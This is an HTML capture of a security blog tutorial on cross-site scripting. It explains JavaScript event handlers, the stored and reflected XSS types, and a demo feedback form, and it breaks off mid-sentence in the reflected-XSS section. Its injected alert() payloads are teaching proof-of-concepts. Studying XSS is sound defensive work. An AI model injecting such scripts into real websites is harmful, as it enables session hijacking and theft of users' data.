+			position: absolute;
+			clip: rect(1px, 1px, 1px, 1px);
+			}
+			</style>
+	<style id="custom-background-css">
+body.custom-background { background-color: #dd3333; }
+</style>
+			<style id="wp-custom-css">
+			p {
+font-size:28px;
+}
+p { color:#000000; }
+@media all and (min-width: 56.25em) {
+
+  .post-title {
+    font-size: 28px;
+    line-height: 1.357;
+  }
+}
+@media all and (min-width: 68.75em) {
+
+  .post-title {
+    font-size: 38px;
+    line-height: 1.5;
+  }
+}
+
+/* Grid style */
+.display-posts-listing.grid {
+	display: grid;
+	grid-gap: 16px;
+}
+
+.display-posts-listing.grid .title {
+	display: block;
+}
+
+.display-posts-listing.grid img { 
+	display: block; 
+	max-width: 100%; 
+	height: auto; 
+}
+
+@media (min-width: 600px) {
+	.display-posts-listing.grid {
+		grid-template-columns: repeat( 2, 1fr );
+	}
+}
+
+@media (min-width: 1024px) {
+	.display-posts-listing.grid {
+		grid-template-columns: repeat( 3, 1fr );
+	}
+}		</style>
+		<meta name="generator" content="WordPress Download Manager 6.1.0">
+                <link href="https://fonts.googleapis.com/css2?family=Rubik" rel="stylesheet">
+        <style>
+            .w3eden .fetfont,
+            .w3eden .btn,
+            .w3eden .btn.wpdm-front h3.title,
+            .w3eden .wpdm-social-lock-box .IN-widget a span:last-child,
+            .w3eden .card-header,
+            .w3eden .card-footer,
+            .w3eden .badge,
+            .w3eden .label,
+            .w3eden .table,
+            .w3eden .card-body,
+            .w3eden .wpdm-frontend-tabs a,
+            .w3eden .alert:before,
+            .w3eden .discount-msg,
+            .w3eden .panel.dashboard-panel h3,
+            .w3eden #wpdm-dashboard-sidebar .list-group-item,
+            .w3eden #package-description .wp-switch-editor,
+            .w3eden .w3eden.author-dashbboard .nav.nav-tabs li a,
+            .w3eden .wpdm_cart thead th,
+            .w3eden #csp .list-group-item,
+            .w3eden .modal-title {
+                font-family: Rubik, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            }
+            .w3eden .btn
+            {
+                font-weight: 800 !important;
+            }
+            .w3eden .btn {
+                letter-spacing: 1px;
+                text-transform: uppercase;
+            }
+            .w3eden #csp .list-group-item {
+                text-transform: unset;
+            }
+
+
+        </style>
+            <style>
+        /* WPDM Link Template Styles */        </style>
+                <style>
+
+            :root {
+                --color-primary: #4a8eff;
+                --color-primary-rgb: 74, 142, 255;
+                --color-primary-hover: #5998ff;
+                --color-primary-active: #3281ff;
+                --color-secondary: #6c757d;
+                --color-secondary-rgb: 108, 117, 125;
+                --color-secondary-hover: #6c757d;
+                --color-secondary-active: #6c757d;
+                --color-success: #018e11;
+                --color-success-rgb: 1, 142, 17;
+                --color-success-hover: #0aad01;
+                --color-success-active: #0c8c01;
+                --color-info: #2CA8FF;
+                --color-info-rgb: 44, 168, 255;
+                --color-info-hover: #2CA8FF;
+                --color-info-active: #2CA8FF;
+                --color-warning: #FFB236;
+                --color-warning-rgb: 255, 178, 54;
+                --color-warning-hover: #FFB236;
+                --color-warning-active: #FFB236;
+                --color-danger: #ff5062;
+                --color-danger-rgb: 255, 80, 98;
+                --color-danger-hover: #ff5062;
+                --color-danger-active: #ff5062;
+                --color-green: #30b570;
+                --color-blue: #0073ff;
+                --color-purple: #8557D3;
+                --color-red: #ff5062;
+                --color-muted: rgba(69, 89, 122, 0.6);
+                --wpdm-font: "Rubik", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            }
+
+            .wpdm-download-link.btn.btn-primary {
+                border-radius: 4px;
+            }
+
+
+        </style>
+                <script>
+            function wpdm_rest_url(request) {
+                return "../../../../wp-json/wpdm/index.html" + request;
+            }
+        </script>
+        </head>
+
+<body class="post-template-default single single-post postid-9053 single-format-standard custom-background">
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#primary">Skip to content</a>
+	
+				<header id="masthead" class="site-header style2 d-none d-sm-none d-md-block">
+				<div>
+										<div id="middle-bar">
+	<div class="container">
+		<div class="row">
+			<div class="social-menu-wrapper col">
+							</div>
+			
+			<div id="site-branding" class="col">
+									<div class="site-title h1"><a href="../../../../index.html" rel="home"></a></div>
+			</div><!-- .site-branding -->
+			
+			<div id="top-search" class="col">
+				<form role="search" method="get" class="search-form" action="../../../../index.html">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s">
+				</label>
+				<input type="submit" class="search-submit" value="Search">
+			</form>	
+			</div>
+		</div>
+	</div>
+</div>	
+					<div id="bottom-bar">
+	<nav id="site-navigation" class="main-navigation">
+		<div class="container">
+			<div id="primary-menu" class="menu"></div>
+		</div>
+	</nav><!-- #site-navigation -->
+</div>				</div>		
+			</header><!-- #masthead -->
+			
+	 
+	<header id="masthead-mobile" class="d-flex d-sm-flex d-md-none">
+		<a href="#sidr" id="sidr-toggle" class="toggle-menu-hamburger"><i class="fa fa-bars"></i></a>
+		<div id="site-branding-mobile">
+			<div class="site-title h1"><a href="../../../../index.html" rel="home"></a></div>
+	</div><!-- .site-branding -->		<a href="#search-drop" class="search-toggle"><i class="fa fa-search"></i></a>
+	</header>	
+
+	<div class="container">
+		<div class="row">			<div class="acme-ticker-wrapper container d-none d-sm-none d-md-block">
+			<div class="acme-news-ticker">
+					<div class="acme-news-ticker-label">Latest Tools &amp; Resources</div>
+					<div class="acme-news-ticker-box">
+						<ul class="my-news-ticker">
+													
+							<li class="ticker-post"> 
+								<a href="../web-server-lab-setup-for-penetration-testing/index.html">
+									Web Server Lab Setup for Penetration Testing																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="">
+									Comprehensive Guide on Cross-Site Scripting (XSS)																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../database-penetration-testing-using-sqlmap/index.html">
+									Database Penetration Testing using Sqlmap																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../command-injection-exploitation-using-web-delivery-linux-windows/index.html">
+									Command Injection Exploitation using Web Delivery (Linux, Windows).																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../how-to-set-up-sqli-lab/index.html">
+									How to set up SQLI Lab																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/64-bit-linux-assembly-and-shellcoding/index.html">
+									64-bit Linux Assembly and Shellcoding																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/osint-user-privacy-in-linux/index.html">
+									OSINT : User Privacy in Linux																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/exploiting-the-webserver-using-sqlmap-and-metasploit-os-pwn/index.html">
+									Exploiting the Webserver using Sqlmap and Metasploit (OS-Pwn)																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/covert-channel-the-hidden-network/index.html">
+									Covert Channel: The Hidden Network																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/hiding-ip-during-pentest-using-powershell-empire-http_hop/index.html">
+									Hiding IP During Pentest using PowerShell Empire (http_hop).																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/multiple-ways-to-exploiting-network-machine-using-powershell-empire/index.html">
+									Multiple Ways to Exploiting Network Machine using PowerShell Empire.																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../10/simple-bash-scripts-for-cybersecurity-enhancing-your-security-arsenal/index.html">
+									Simple Bash Scripts For Cybersecurity, Enhancing Your Security Arsenal.																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/apache-tomcat-penetration-testing/index.html">
+									Apache Tomcat Penetration Testing																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/penetration-testing-on-mysql-port-3306/index.html">
+									Penetration Testing on MYSQL (Port 3306)																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/advanced-system-network-pen-testing-guides/index.html">
+									Advanced System &amp; Network Pen-Testing Guides																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/vulnerability-scanning/index.html">
+									Vulnerability Scanning																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/network-enumeration/index.html">
+									Network Enumeration																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/scanning-a-target-network/index.html">
+									Scanning a Target Network																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/18/what-is-footprinting-and-reconnaissance/index.html">
+									What is Footprinting and Reconnaissance?																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/15/how-to-use-hydra-to-crack-passwords-penetration-testing/index.html">
+									How to Use Hydra&#8202; to Crack Passwords &ndash; Penetration Testing.																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/15/password-cracking-hash-gathering/index.html">
+									Password Cracking &amp; Hash Gathering																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../11/15/cracking-passwords-with-john-the-ripper-a-comprehensive-guide/index.html">
+									Cracking Passwords with John the Ripper: A Comprehensive Guide&nbsp;																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../../2022/07/28/sql-injection-with-shell-access/index.html">
+									SQL Injection with Shell Access																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../../2022/07/28/sql-injections-tools-and-attacks/index.html">
+									SQL Injections: Tools and Attacks																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../../2022/07/28/web-application-security-tools-and-attacks/index.html">
+									Web Application Security: Tools and Attacks																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+														
+							<li class="ticker-post"> 
+								<a href="../../../../2022/06/03/the-metasploit-framework/index.html">
+									Networking 101																		<span class="footer-meta"><time class="entry-date published updated" datetime=""></time></span>
+								</a>
+							</li>
+							
+													</ul>
+					</div>
+					<div class="acme-news-ticker-controls acme-news-ticker-vertical-controls">
+						<button class="acme-news-ticker-arrow acme-news-ticker-prev"></button>
+						<button class="acme-news-ticker-pause"></button>
+						<button class="acme-news-ticker-arrow acme-news-ticker-next"></button>
+					</div>
+			</div> 
+		</div>
+
+	<main id="primary" class="site-main col-md-12">
+
+		<article id="post-9053" class="single-style1 post-9053 post type-post status-publish format-standard has-post-thumbnail hentry category-sql-botnets-and-xss-attacks-tools-and-resources">
+
+	<header class="entry-header">
+		<h1 class="entry-title">Comprehensive Guide on Cross-Site Scripting (XSS)</h1>	
+			<div class="entry-meta">
+				<span class="posted-on">Posted on <a href="" rel="bookmark"><time class="entry-date published" datetime=""></time><time class="updated" datetime=""></time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../../../author/julisunkan/index.html"></a></span></span>			</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	
+			<div class="post-thumbnail">
+				<img width="550" height="357" src="../../../../wp-content/uploads/2024/12/xss.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high">			</div><!-- .post-thumbnail -->
+
+		
+	<div class="entry-content clearfix">
+		
+<p><em>Have you ever welcomed with a pop-up, when you visit a web-page or when you hover at some specific text? Imagine, if these pop-ups become a vehicle, which thus delivers malicious payload into your system or even capture up some sensitive information.</em>&nbsp;Today, in this guide, we&rsquo;ll take a tour to&nbsp;<strong>Cross</strong>&ndash;<strong>Site</strong>&nbsp;<strong>Scripting&nbsp;</strong>and would learn how an attacker executes malicious JavaScript codes over at the input parameters and generates such pop-ups, in order to deface the web-application or to hijack the active user&rsquo;s session.</p>
+
+
+
+<p><strong>Table of Content</strong></p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;What is JavaScript?</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavaScript Event Handlers</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Introduction to Cross-Site Scripting (XSS)</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Impact of Cross-Site Scripting</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Types of XSS</p>
+
+
+
+<p>o&nbsp;&nbsp;&nbsp;Reflected XSS</p>
+
+
+
+<p>o&nbsp;&nbsp;&nbsp;Stored XSS</p>
+
+
+
+<p>o&nbsp;&nbsp;&nbsp;DOM-based XSS</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cross-Site Scripting Exploitation</p>
+
+
+
+<p>o&nbsp;&nbsp;&nbsp;Credential Capturing</p>
+
+
+
+<p>o&nbsp;&nbsp;&nbsp;Cookie Capture</p>
+
+
+
+<p>o&nbsp;&nbsp;&nbsp;Fuzzing</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;Burpsuite</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;XSSer</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mitigation Steps</p>
+
+
+
+<p><strong>What is JavaScript?</strong></p>
+
+
+
+<p>A dynamic web-application stands up over three pillars i.e.&nbsp;<strong>HTML &ndash;&nbsp;</strong>which determines up the complete structure,&nbsp;<strong>CSS &ndash;&nbsp;</strong>describes its overall look and feel, and the&nbsp;<strong>JavaScript &ndash;&nbsp;</strong>which simply adds powerful interactions to the application such as alert-boxes, rollover effects, dropdown menus and other things.</p>
+
+
+
+<p>So,&nbsp;<strong>JavaScript is the programming language of the web&nbsp;</strong>and is considered to be one of the most popular scripting languages as about&nbsp;<strong>93% of the total websites</strong>&nbsp;runs with Javascript, due to some of its major features i.e.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It is easy to learn.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It helps to build interactive web-applications.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Is the only the programming language that can be&nbsp;<strong>interpreted</strong>&nbsp;<strong>by</strong>&nbsp;the&nbsp;<strong>browser</strong>&nbsp;i.e. the browser runs it, instead of displaying it.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It is flexible, as it simply gets&nbsp;<strong>blends</strong>&nbsp;<strong>up</strong>&nbsp;<strong>with</strong>&nbsp;the&nbsp;<strong>HTML</strong>&nbsp;codes.</p>
+
+
+
+<p><strong>JavaScript Event Handlers</strong></p>
+
+
+
+<p>When a JavaScript code is embedded over into HTML page, then this JavaScript&nbsp;<strong>&ldquo;react&rdquo;</strong>&nbsp;on some specific events like:</p>
+
+
+
+<p>When the page loads up, it is an event. When the user clicks a button, that clicks is too an event. Other examples such as &ndash; pressing any key, closing a window, resizing a window, etc. Therefore such events are thus managed by some&nbsp;<strong>event-handlers.</strong></p>
+
+
+
+<p><strong>Onload</strong></p>
+
+
+
+<p>Javascript uses the&nbsp;<strong>onload</strong>&nbsp;<strong>function</strong>&nbsp;to load an object over on a web page.</p>
+
+
+
+<p><em>For example, I want to generate an alert for user those who visit my website; I will give the following JavaScript code.</em></p>
+
+
+
+<pre class="wp-block-preformatted">&nbsp;&lt;body onload=alert(&lsquo;Welcome to Hacking Articles&rsquo;)&gt;</pre>
+
+
+
+<p>So whenever the body tag loads up, an alert will pop up with the following text&nbsp;<strong><em>&ldquo;Welcome to Hacking Articles&rdquo;</em></strong>. Here the&nbsp;<strong>loading of the body tag is an &ldquo;event&rdquo;</strong>&nbsp;or a happening and&nbsp;<strong>&ldquo;onload&rdquo; is an event handler</strong>&nbsp;which decides what action should happen on that event.</p>
+
+
+
+<p><strong>Onmouseover</strong></p>
+
+
+
+<p>With the Onmouseover event handler, when a user moves his cursor over a specific text, the embedded javascript code will get executed.</p>
+
+
+
+<p><em>For example, let us understand the following code:</em></p>
+
+
+
+<pre class="wp-block-preformatted">&lt;a onmouseover=alert(&ldquo;50% discount&rdquo;)&gt;surprise&lt;/a&gt;</pre>
+
+
+
+<p><em>Now when the user moves his cursor over the&nbsp;<strong>surprise</strong>&nbsp;the displayed text on the page, an alert box will pop up with 50% discount.</em></p>
+
+
+
+<p>Similarly, there are many JavaScript event handlers, which defines what event should occur for such type of actions like a scroll down, or when an image fails to load etc.</p>
+
+
+
+<figure class="wp-block-table"><table class="has-fixed-layout"><tbody><tr><td><strong>onclick:</strong></td><td>Use this to invoke JavaScript upon clicking (a link, or form boxes)</td></tr><tr><td><strong>onload:</strong></td><td>Use this to invoke JavaScript after the page or an image has finished loading</td></tr><tr><td><strong>onmouseover</strong></td><td>Use this to invoke JavaScript if the mouse passes by some link</td></tr><tr><td><strong>onmouseout</strong></td><td>Use this to invoke JavaScript if the mouse goes pass some link</td></tr><tr><td><strong>onunload</strong></td><td>Use this to invoke JavaScript right after someone leaves this page.</td></tr></tbody></table></figure>
+
+
+
+<p><strong><br>Introduction to Cross-Site Scripting (XSS)</strong></p>
+
+
+
+<p><strong>C</strong>ross-<strong>S</strong>ite&nbsp;<strong>S</strong>cripting often abbreviated as&nbsp;<strong>&ldquo;XSS&rdquo;&nbsp;</strong>is a client-side code injection attack where malicious&nbsp;<strong>scripts</strong>&nbsp;<strong>are</strong>&nbsp;<strong>injected</strong>&nbsp;<strong>into</strong>&nbsp;<strong>trusted</strong>&nbsp;<strong>websites</strong>. XSS occurs over in those web-applications where the input-<strong>parameters</strong>&nbsp;are&nbsp;<strong>not</strong>&nbsp;<strong>properly</strong>&nbsp;<strong>sanitized</strong>&nbsp;or validated which thus allows an attacker to send malicious Javascript codes over at a different end-user. The end user&rsquo;s browser has no way to know that the script should not be trusted, and will thus execute up the script.</p>
+
+
+
+<p>In this attack,&nbsp;<strong>the users are not directly targeted through a payload</strong>, although the attacker shoots the XSS vulnerability by&nbsp;<strong>inserting a malicious script into a web page</strong>&nbsp;that appears to be a genuine part of the website. So, when any user visits that website, the XSS suffering web-page will deliver the malicious JavaScript code directly over to his browser without his knowledge.</p>
+
+
+
+<p>Confused with what&rsquo;s happening? Let&rsquo;s make it more clear with the following example.</p>
+
+
+
+<p><em>Consider a web application that allows its users to set-up their&nbsp;<strong>&ldquo;brief description&rdquo;</strong>&nbsp;over at their profile, which is thus&nbsp;<strong>visible</strong>&nbsp;<strong>to</strong>&nbsp;<strong>everyone</strong>. Now the attacker notice that the description field is not properly validating the inputs, so he injects his malicious script into that<strong>&nbsp;field.</strong></em></p>
+
+
+
+<p><em>Now, whenever the visitor views the attacker&rsquo;s profile, the code get&rsquo;s automatically executed by the browser and therefore it captures up the authenticated cookies and over on the other side, the attacker would have the victim&rsquo;s active session.</em></p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" width="907" height="446" src="../../../../wp-content/uploads/2024/12/1-5.png" alt="" class="wp-image-9093"></figure>
+
+
+
+<p><strong>Impact of Cross-Site Scripting</strong></p>
+
+
+
+<p>From the last decay,&nbsp;<strong>C</strong>ross-<strong>S</strong>ite&nbsp;<strong>Sc</strong>ripting has managed its position in the&nbsp;<strong>OWASP Top10 list,</strong>&nbsp;as it is one of the most crucial and the most widely-used attack method on the internet.</p>
+
+
+
+<p>Therefore, over with this vulnerability, the attacker could:</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Capture and access the user&rsquo;s authenticated session cookies.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Uploads a phishing page to lure the users into unintentional actions.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Redirects the visitors to some other malicious sections.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Expose the user&rsquo;s sensitive data.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Manipulates the structure of the web-application or even defaces it.</p>
+
+
+
+<p>However, XSS has been reported with a&nbsp;<strong>&ldquo;CVSS Score&rdquo;&nbsp;</strong>of<strong>&nbsp;&ldquo;6.1&rdquo;&nbsp;</strong>as on&nbsp;<strong>&ldquo;Medium&rdquo; Severity&nbsp;</strong>under</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>CWE-79</strong>: Improper Neutralization of Input During Web Page Generation (&lsquo;Cross-site Scripting&rsquo;)</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>CWE-80</strong>: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</p>
+
+
+
+<p><strong>Types of XSS</strong></p>
+
+
+
+<p>Up till now, you might be having a clear vision with the concept of&nbsp;<strong>JavaScript</strong>&nbsp;and&nbsp;<strong>XSS&nbsp;</strong>and its major consequences. So, let&rsquo;s continue down on the same road and break this XSS into three main types as &ndash;</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;<strong>Stored XSS</strong></p>
+
+
+
+<p>&sect;&nbsp;&nbsp;<strong>Reflected XSS</strong></p>
+
+
+
+<p>&sect;&nbsp;&nbsp;<strong>DOM-based XSS</strong></p>
+
+
+
+<p><strong><u>Stored</u></strong><strong>&nbsp;<u>XSS</u></strong></p>
+
+
+
+<p><strong>&ldquo;Stored</strong>&nbsp;<strong>XSS&rdquo;</strong>&nbsp;often termed as&nbsp;<strong>&ldquo;<em>Persistent XSS</em>&rdquo;&nbsp;</strong>or&nbsp;<strong><em>&ldquo;Type I&rdquo;</em></strong><em>,</em>&nbsp;&nbsp;as over through this vulnerability the injected malicious script gets permanently stored inside the web application&rsquo;s database server and the server further drops it out back, when the user visits the respective website.</p>
+
+
+
+<p>However, this happens in a way as -.&nbsp;<em>when the client clicks or hovers a particular infected section, the injected JavaScript will get executed by the browser as it was already into the application&rsquo;s database. Therefore this attack does not require any phishing technique to target its users.</em></p>
+
+
+
+<p>The most common example of&nbsp;<strong>Stored XSS</strong>&nbsp;is the&nbsp;<em><strong>&ldquo;comment option&rdquo;</strong></em>&nbsp;in the blogs, which allow any user to enter his feedback as in the form of comments for the administrator or other users.</p>
+
+
+
+<p>Let&rsquo;s carry this up by considering an example:</p>
+
+
+
+<p>A web-application is asking its user to submit their feedback, as there on its webpage it is having two input fields- one for the name and other for the comment.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" width="627" height="288" src="../../../../wp-content/uploads/2024/12/5-5.png" alt="" class="wp-image-9092"></figure>
+
+
+
+<p>Now, whenever the user hits up the&nbsp;<strong>submits</strong>&nbsp;button, his entry gets stored into the database. To make it more clear, I&rsquo;ve called up the database table on the screen as:</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="538" height="342" src="../../../../wp-content/uploads/2024/12/6-6.png" alt="" class="wp-image-9090"></figure>
+
+
+
+<p>Here, the developer trusts his users and&nbsp;<strong>hadn&rsquo;t placed any validations over at the fields</strong>. So this loophole was encountered by the attacker and therefore he took advantage of it, as &ndash; instead of submitting the feedback, he&nbsp;<strong>commented</strong>&nbsp;his&nbsp;<strong>malicious</strong>&nbsp;<strong>script</strong>.</p>
+
+
+
+<pre class="wp-block-preformatted">&lt;script&gt;alert("Hey!! This website belongs to Hacking Articles")&lt;/script&gt;</pre>
+
+
+
+<p>From the below screenshot, you can see that the attacker got success, as the web-application reflects with an alert pop-up.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="520" height="262" src="../../../../wp-content/uploads/2024/12/7-5.png" alt="" class="wp-image-9076"></figure>
+
+
+
+<p>Now, back on the database, you can see that the table has been updated with&nbsp;<strong>Name&nbsp;</strong>as&nbsp;<strong>&ldquo;Ignite&rdquo;&nbsp;</strong>and the&nbsp;<strong>Feeback&nbsp;</strong>field is empty, this clears up that the attacker&rsquo;s script had been injected successfully.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="320" height="122" src="../../../../wp-content/uploads/2024/12/9-4.png" alt="" class="wp-image-9060"></figure>
+
+
+
+<p>So let&rsquo;s switch to another browser as a different user and would again try to submit genuine feedback.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="343" height="232" src="../../../../wp-content/uploads/2024/12/10.0.png" alt="" class="wp-image-9055"></figure>
+
+
+
+<p>Now when we hit the&nbsp;<strong>Submit&nbsp;</strong>button, our browser will execute the injected script and reflects it on the screen.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="529" height="178" src="../../../../wp-content/uploads/2024/12/10-4.png" alt="" class="wp-image-9057"></figure>
+
+
+
+<p><strong><u>Reflected</u></strong><strong>&nbsp;<u>XSS</u></strong></p>
+
+
+
+<p>The&nbsp;<strong>Reflected</strong>&nbsp;<strong>XSS</strong>&nbsp;also termed as&nbsp;<strong>&ldquo;Non-Persistence XSS&rdquo;&nbsp;</strong>or&nbsp;<strong><em>&ldquo;Type II&rdquo;</em></strong>, occurs when the web application responds immediately on user&rsquo;s input without validating what the user entered, this can lead an attacker to inject browser executable code inside the single HTML response. It is termed&nbsp;<strong>&ldquo;non-persistent&rdquo;</strong>&nbsp;as the malicious script&nbsp;<strong>does not get stored inside the web-server&rsquo;s database</strong>,&nbsp;<em>thus the attacker needs to send the malicious link through phishing in order to trap the user.</em></p>
+
+
+
+<p>Reflected XSS is the most common and thus can be easily found over at the&nbsp;<strong>&ldquo;website&rsquo;s search fields&rdquo;</strong>&nbsp;where the attacker includes some arbitrary Javascript codes in the search textbox and, if the website is vulnerable, the web-page return up the event as was described into the script.</p>
+
+
+
+<p>Reflect XSS is a major with two types:</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;<strong>Reflected XSS GET</strong></p>
+
+
+
+<p>&sect;&nbsp;&nbsp;<strong>Reflected XSS POST</strong></p>
+
+
+
+<p>To be more clear with the concept of Reflected XSS, let&rsquo;s check out the following scenario.</p>
+
+
+
+<p>Here, we&rsquo;ve created a webpage, which thus permits up the user to search for a particular&nbsp;<strong>training course</strong>.</p>
+
+
+
+<p>So, when the user searches for&nbsp;<strong>&ldquo;Bug Bounty&rdquo;</strong>, a message prompts back over on the screen as&nbsp;<em><strong>&ldquo;You have searched for Bug Bounty.&rdquo;</strong></em></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="732" height="307" src="../../../../wp-content/uploads/2024/12/11-3.png" alt="" class="wp-image-9082"></figure>
+
+
+
+<p>Thus, this instant response and the&nbsp;<strong>&ldquo;search&rdquo;&nbsp;</strong>parameter in the URL shows up that, the page might be vulnerable to XSS and even the data has been requested over through the GET method.</p>
+
+
+
+<p>So, let&rsquo;s now try to generate some pop-ups by injecting Javascript codes over into this&nbsp;<strong>&ldquo;search&rdquo;</strong>&nbsp;<strong>parameter</strong>&nbsp;as</p>
+
+
+
